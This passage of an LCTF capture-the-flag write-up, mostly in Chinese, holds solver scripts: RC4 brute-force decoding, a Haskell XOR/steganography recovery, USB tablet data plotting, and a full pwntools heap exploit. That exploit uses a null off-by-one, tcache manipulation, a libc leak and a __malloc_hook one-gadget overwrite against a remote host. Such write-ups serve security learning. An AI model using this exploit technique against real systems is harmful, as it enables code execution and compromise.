.cinit:0000C406 .byte 65h ; e  
.cinit:0000C407 .byte 66h ; f  
.cinit:0000C408 .byte 4Ch ; L  
.cinit:0000C409 .byte 43h ; C  
.cinit:0000C40A .byte 54h ; T  
.cinit:0000C40B .byte 46h ; F  
.cinit:0000C40C .byte 30h ; 0  
.cinit:0000C40D .byte 30h ; 0  
.cinit:0000C40E .byte 30h ; 0  
.cinit:0000C40F .byte 30h ; 0
    d='2db7b1a0bda4772d11f04412e96e037c370be773cd982cb03bc1eade'.decode('hex')
    def KSA(key):
        keylength = len(key)
        S = range(256)
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % keylength]) % 256
            S[i], S[j] = S[j], S[i]  # swap
        return S
    def PRGA(S):
        i = 0
        j = 0
        while True:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]  # swap
            K = S[(S[i] + S[j]) % 256]
            yield K
    def RC4(key):
        S = KSA(key)
        return PRGA(S)
    def decode(key, plaintext):
        def convert_key(s):
            return [ord(c) for c in s]
        key = convert_key(key)
        keystream = RC4(key)
        d=''
        for c in plaintext:
            d+=chr((ord(c) ^ keystream.next()))
        return d
    for x in range(256):
        key = [0,0,0,0]
        key[0] = chr((x*3)%256)
        key[1] = chr((x*2)%256)
        key[2] = chr(((x&0x74)*2)%256)
        key[3] = chr((x+0x50)%256)
        key = ''.join(key)
        print decode('LCTF'+key, d)
# Misc
## 想起“恐怖的回忆”
极速入门 Haskell
`Main.hs` 为程序入口，先做一个 `ord`，然后先 `encryptoData` 再 `encodePicture`。先从加密的函数开始读：
    -- Crypto.hs
    -- 为方便阅读，有些地方修改成伪代码了
    module Crypto (encryptoData) where
    imports
    initIV :: [Int]
    initIV = [55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97]
    initKey :: [Int]
    initKey = [75,111,109,101,105,106,105,83,97,116,111,114,105]
    blockLen :: Int
    blockLen = 32
    paddingData :: Int
    paddingData = 5
    -- 填充的内容为数字 5
    paddingX :: Int -> a -> [a] -> [a]
    paddingX n c d = d concat n * c
    -- 填充
    type Calc = State [Int] [Int]
    xorKey :: [Int] -> Int -> Calc
    xorKey key n = gets $ \iv ->
        map (xor n) $ zipWith xor iv $
        take (length iv) $ cycle key
    -- 先 cycle key 然后取前 32 位，然后对 iv 与 key 逐位 xor
    calcData :: Calc
    calcData = do
        y  [Int]
    encryption d = evalState calcData d
    -- 此函数作为 encodeBlock 的第一个参数传递，注意到 encodeBlock 里传给这个函数的参数为 iv，即 d 为 iv
    -- 综合上边俩函数的分析，有 encryption = key .xor iv .xor 198
    type DataBlock = Writer [Int] [Int]
    initBlock :: [Int] -> DataBlock
    initBlock iv = return iv
    encodeBlock :: ([Int] -> [Int]) -> DataBlock -> [Int] -> DataBlock
    encodeBlock f db msg = db >>= (\iv -> writer (f iv, zipWith xor msg $ f iv ))
    -- encryption = cycle_key .xor IV .xor 198
    -- 这里只是再 xor msg 然后写入原 list 而已
    foldData :: [[Int]] -> DataBlock
    foldData list = foldl (encodeBlock encryption) (initBlock initIV) list
    setData :: [Int] -> [[Int]]
    setData d = warpList blockLen $
        paddingX (32 - len(d) % 32) paddingData d
        -- pading n c d
    -- 在原始数据的基础上，padding 到 32 整数倍，padding 内容为数字 5
    -- 然后每 32 位分组，成为二维数组
    encryptoData :: [Int] -> [Int]
    encryptoData d = execWriter $ foldData $ setData d
    -- 从右往左分别做填充，加密，并将加密的结果替换(写入)到原list
`encryptoData` 的加密结果是 `(cycle_key .xor IV .xor 198) xor padded_message`  
现在的问题只剩下读懂 `Image.hs`，看一下加密后的结果是怎么编码进图片的了：
    -- Image.hs，伪代码
    module Image (encodePicture) where
    imports
    type Px = (Int, Int)
    bitX :: Int -> Int -> Int
    bitX d n = shiftR d n .&. 0x01
    splitData :: [Int] -> [Px]
    splitData d = func  d  [6, 4, 2, 0]
        where
            func x y = (bitX x $ y + 1, bitX x y)
    -- [(1,1),(1,1),(1,1),(1,1)  --> 二进制, max=255]
    data PxMatrix = PxMatrix {
        pxLen :: Int,
        pxEnd :: Int,
        pxData :: [[Px]]
    }
    matrixData :: Image PixelRGB8 -> [Px] -> PxMatrix
    matrixData img pxs = let d = warpList (imageWidth img) pxs
                         in PxMatrix (length d - 1) (length (last d) - 1) d
    -- 按图片宽度对上边的二进制数对进行再次分组
    matrixAt :: PxMatrix -> Int -> Int -> Px
    matrixAt pm x y
        | y > pxLen pm = (0,0)
        | (y == pxLen pm) && (x > pxEnd pm) = (0,0)
        | otherwise = (pxData pm) !! y !! x
    -- 矩阵取下标
    mixImage :: Image PixelRGB8 -> PxMatrix -> Image PixelRGB8
    mixImage img pm = pixelMapXY func img
        where
            up n px = fromIntegral (xor n $ fromIntegral px)
            func x y (PixelRGB8 r g b) = let (r',g') = matrixAt pm x y
                                         in PixelRGB8 (up r' r) (up g' g) b
    -- 在 R, G 通道搞事情，B 通道不变
    -- R xor 二进制数对第一个数，G xor 第二个数
    encodePicture :: FilePath -> FilePath -> [Int] -> IO ()
    encodePicture ifp ofp d = readImage ifp >>= \e ->
        case e of
            Left msg -> putStrLn msg
            Right dimg -> let img = convertRGB8 dimg in
                writePng ofp $ mixImage img $
                    matrixData img $ splitData d
于是，exp：
    from PIL import Image
    import numpy as np
    I = np.array(Image.open('input.png').convert('RGB'))
    O = np.array(Image.open('output.png').convert('RGB'))
    i_o_xor = (I ^ O)[:, :, :2]#.swapaxes(0, 1)
    data = ''.join(np.where(i_o_xor.reshape(-1) == 1, '1', '0'))[:8*6400]
    enc_mat = [int(data[i:i+8], base=2) for i in range(0,len(data),8)]
    enc_mat = [enc_mat[i:i+32] for i in range(0, len(enc_mat), 32)]
    IV = np.array([55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97])
    key = np.array([75,111,109,101,105,106,105,83,97,116,111,114,105,75,111,109,101,105,106,105,83,97,116,111,114,105,75,111,109,101,105,106])
    xor_mat1 = IV ^ key ^ 198
    xor_mat2 = np.array([55,48,49,99,99,57,97,52,57,101,51,48,100,51,53,98,101,98,98,56,49,102,98,97,102,99,51,99,57,98,101,97])
    # ''.join(list(map(chr, list(np.array([xor_mat2 ^ i for n, i in enumerate(enc_mat) if n % 2 else xor_mat1 ^ i]).reshape(-1)))))
    plaintext = []
    for n, i in enumerate(enc_mat):
        if n % 2:
            xmat = xor_mat2
        else:
            xmat = xor_mat1
        plaintext.append(xmat ^ i)
    print(''.join([''.join(map(chr, i)) for i in plaintext]))
刚开始写完 exp 发现只能解出一半的明文，估计是代码哪里读漏了。
发现明文 xor 的对象交替变换，改一下代码，得到明（歌）文（词），`LCTF{GameAlwaysOver_TryAgain}`
## 你会玩OSU！么？
~~从这里看应该不是数位板~~
看到 CTL-472
的字样，搜了一下好像是[绘图板](http://detail.zol.com.cn/shouxiehuihua/index1183603.shtml)
看来不是鼠标，这个是我的g603,抓下来就是偏移很明显
exp:
data里是这样的数据：  
    from PIL import Image
    img = Image.new("RGB",(0x380,0x300))
    pixTuple = (255,0,255,15)
    fp = open('data')
    while True:
        ch = fp.readline().strip('\n \r')
        if not ch:
            break
        ch = ch.decode('hex')
        print ch[2:4][::-1].encode('hex'),ch[4:6][::-1].encode('hex')
        img.putpixel((int(ch[2:4][::-1].encode('hex'),16)/0x10,int(ch[4:6][::-1].encode('hex'),16)/0x10),pixTuple)
    img.save("dump.png")
LCTF{OSU_1S_GUUUD}
# PWN
## easy heap
libc 2.27
malloc的时候，readn函数有null off by one
exp:
    #coding=utf8
    from pwn import *
    context.log_level = 'debug'
    context.terminal = ['gnome-terminal','-x','bash','-c']
    local = 0
    if local:
        # cn = process('./easy_heap')
        cn = remote('0',10002)
        bin = ELF('./easy_heap',checksec=False)
        libc = ELF('./libc_2.27.so',checksec=False)
    else:
        cn = remote('118.25.150.134', 6666)
        libc = ELF('./libc_2.27.so',checksec=False)
        pass
    def z(a=''):
        if local:
            gdb.attach('easyheap',gdbscript=a,exe='easy_heap')
            if a == '':
                raw_input()
    def add(con,size):
        cn.sendlineafter('>','1')
        cn.sendlineafter('>',str(size))
        cn.sendlineafter('>',con)
    def dele(idx):
        cn.sendlineafter('>','2')
        cn.sendlineafter('>',str(idx))
    def show(idx):
        cn.sendlineafter('>','3')
        cn.sendlineafter('>',str(idx))
    for i in range(10):
        add('asd',10)
    dele(1) #1
    for i in range(3,8):
        dele(i) #2,6
    dele(9)#7
    dele(8) #small1
    dele(2) #s2
    dele(0) #s3
    for i in range(7):
        add('asd',10)
    # now only 3 smallbin 0->2->8
    add('',0) # 0
    add('',0xf8) # 2 && null off by one
    # now only 8 in tcache
    for i in range(5):
        dele(i) # tcache 2,6
    dele(6) # tcache 7
    dele(5) #small trigger unlink
    for i in range(7):
        add('asd',10)
    show(8)
    cn.recvuntil('> ')
    lbase = u64(cn.recvuntil('\n')[:-1].ljust(8,'\x00'))-0x3ebc40-96
    success('lbase: '+hex(lbase))
    # raw_input()
    freehook = lbase+libc.sym['__free_hook']
    mallochook = lbase+libc.sym['__malloc_hook']
    system = lbase+libc.sym['system']
    one = lbase+0x10a38c
    add('OOOO',10)
    dele(7)
    dele(8)
    dele(9)
    add(p64(mallochook),10)
    add(p64(mallochook),10)
    add(p64(one),10)
    # z('b free\nb execve\nc')
    dele(0) #hook
    add('asd',0x10)
    # z()